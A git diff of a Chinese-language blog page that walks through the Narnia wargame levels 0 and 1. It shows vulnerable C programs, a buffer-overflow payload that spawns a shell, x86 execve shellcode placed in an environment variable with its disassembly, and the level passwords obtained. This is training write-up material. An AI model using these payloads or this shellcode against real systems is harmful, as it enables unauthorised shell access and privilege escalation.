@@ -4,7 +4,7 @@
 <meta name="description" content="" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>菜逼也要玩溢出之-Narnia | 随想录</title>
-<link rel="shortcut icon" href="https://v1ncigod.github.io/favicon.ico?v=1567947650201">
+<link rel="shortcut icon" href="https://v1ncigod.github.io/favicon.ico?v=1568731983626">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://v1ncigod.github.io/styles/main.css">
@@ -20,7 +20,7 @@
       <div class="main-content">
         <div class="site-header">
   <a href="https://v1ncigod.github.io">
-  <img class="avatar" src="https://v1ncigod.github.io/images/avatar.png?v=1567947650201" alt="">
+  <img class="avatar" src="https://v1ncigod.github.io/images/avatar.png?v=1568731983626" alt="">
   </a>
   <h1 class="site-title">
     随想录
@@ -92,7 +92,7 @@
             </div>
             
             <div class="post-content">
-              <p>Narnia0
+              <p>Narnia0<br>
 先贴源码</p>
 <pre><code class="language-c">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
@@ -124,15 +124,63 @@ int main(){
 -r--r----- 1 narnia0 narnia0 1229 Aug 26 22:35 narnia0.c
 </code></pre>
 <p><img src="https://v1ncigod.github.io/post-images/1567945119255.png" alt=""></p>
-<p>​	我们需要先明确这个系统编译器编译出来的程序运行时是选用的小端序还是大端序,小端序和大端序其实有个很简单的记法，当是正常排列顺序的时候就是大端,反向排序的时候就是小端。我们可以通过一个函数大的打印来明确是大端序还是小端序，当然也可以直接去尝试，反正两次肯定有一次是对的。使用is_bigendian()函数（C语言的，只需要printf输出就不贴源码了）结果可知，它是小端的。
+<p>​	我们需要先明确这个系统编译器编译出来的程序运行时是选用的小端序还是大端序,小端序和大端序其实有个很简单的记法，当是正常排列顺序的时候就是大端,反向排序的时候就是小端。我们可以通过一个函数大的打印来明确是大端序还是小端序，当然也可以直接去尝试，反正两次肯定有一次是对的。使用is_bigendian()函数（C语言的，只需要printf输出就不贴源码了）结果可知，它是小端的。<br>
 ​	这道题的解题payload就是</p>
 <pre><code class="language-bash">cat &lt;(python -c'print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;') - | ./narnia0
 </code></pre>
 <p>或者</p>
 <pre><code class="language-bash">(python -c'print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;';echo 'cat /etc/narnia_pass/narnia1')|/narnia/narnia0
 </code></pre>
-<p>​		这两个payload是有区别的，这个题有个特殊的位置，当校验val的值为0xdeadbeef的时候启动/bin/sh的时候其实启动了shell，使用payload2的时候python输出字符串的时候会在最后最后带一个截断符号表示结束（EOF），这个位置就跟PHP5作为后端用%00截断一样，当你溢出完成其实交互shell已经启动了，但是由于EOF的原因就会立马结束，所以payload2在后面使用；表示没有结束。通过；进行断句（C语言啊C语言）执行了我们通关命令。payload1就是用了一种很取巧的方式，利用bash中的重定向技巧，通过&lt; ()- 的方式获取一个交互的shell，这个方法跟反弹shell的一些命令都是利用重定向，在这个payload中，首先执行了python的输出的字符串作为.narnia0一开始的输入，然后hold住这个会话，当你输入任何语句都会被当作输入传输到narnia0执行到system(&quot;/bin/sh&quot;)中（真绕）也就实现了交互型的shell。
-从这个口令我们得到了narnia1账号密码efeidiedae</p>
+<p>​		这两个payload是有区别的，这个题有个特殊的位置，当校验val的值为0xdeadbeef的时候启动/bin/sh的时候其实启动了shell，使用payload2的时候python输出字符串的时候会在最后最后带一个截断符号表示结束（EOF），这个位置就跟PHP5作为后端用%00截断一样，当你溢出完成其实交互shell已经启动了，但是由于EOF的原因就会立马结束，所以payload2在后面使用；表示没有结束。通过；进行断句（C语言啊C语言）执行了我们通关命令。payload1就是用了一种很取巧的方式，利用bash中的重定向技巧，通过&lt; ()- 的方式获取一个交互的shell，这个方法跟反弹shell的一些命令都是利用重定向，在这个payload中，首先执行了python的输出的字符串作为.narnia0一开始的输入，然后hold住这个会话，当你输入任何语句都会被当作输入传输到narnia0执行到system(&quot;/bin/sh&quot;)中（真绕）也就实现了交互型的shell。<br>
+从这个口令我们得到了narnia1账号密码efeidiedae<br>
+第二题 Narnia1<br>
+先看源码</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+    int (*ret)();
+
+    if(getenv(&quot;EGG&quot;)==NULL){
+        printf(&quot;Give me something to execute at the env-variable EGG\n&quot;);
+        exit(1);
+    }
+
+    printf(&quot;Trying to execute EGG!\n&quot;);
+    ret = getenv(&quot;EGG&quot;);
+    ret();
+
+    return 0;
+}
+</code></pre>
+<p>这个题关键的行数在于第4行和第12行,第4行在主函数中初始化了一个指针(内存执行下一个位置的标志),第12行调用getenv函数获取环境变量,所以这个位置传入的值在一开始是一个指针,所以当传入值是一段shellcode的时候就会从ret的执行跳转到shellcode的执行。<br>
+查看权限<br>
+<img src="https://v1ncigod.github.io/post-images/1568729036128.png" alt="1568729036128"><br>
+所以我们需要提供一段shellcode去以Narnia1的权限运行Narnia1通过shellcode获取narnia2的权限。<br>
+在http://shell-storm.org/shellcode/files/shellcode-811.php我们找到了一个合适的shellcode适用于这个机器<br>
+构造payload来获取shell</p>
+<pre><code class="language-bash">export EGG=`python -c'print&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;'`
+</code></pre>
+<p>需要特意说的是因为用了三层，最后一层包裹payload的时候使用“或者‘会导致歧义，所以要使用`（也就是Tab键上面，ESC键下面，俗称tick）进行闭合。<br>
+<img src="https://v1ncigod.github.io/post-images/1568730938895.png" alt="1568730938895"><br>
+这段shellcode的功能是实现了调用了一个bin/bash<br>
+他的汇编是</p>
+<pre><code class="language-ASM">Disassembly of section .text:
+
+08048060 &lt;_start&gt;:
+ 8048060: 31 c0                 xor    %eax,%eax
+ 8048062: 50                    push   %eax
+ 8048063: 68 2f 2f 73 68        push   $0x68732f2f
+ 8048068: 68 2f 62 69 6e        push   $0x6e69622f
+ 804806d: 89 e3                 mov    %esp,%ebx
+ 804806f: 89 c1                 mov    %eax,%ecx
+ 8048071: 89 c2                 mov    %eax,%edx
+ 8048073: b0 0b                 mov    $0xb,%al
+ 8048075: cd 80                 int    $0x80
+ 8048077: 31 c0                 xor    %eax,%eax
+ 8048079: 40                    inc    %eax
+ 804807a: cd 80                 int    $0x80
+</code></pre>
+<p>最后得到的答案是nairiepecu</p>
 
             </div>
           </article>
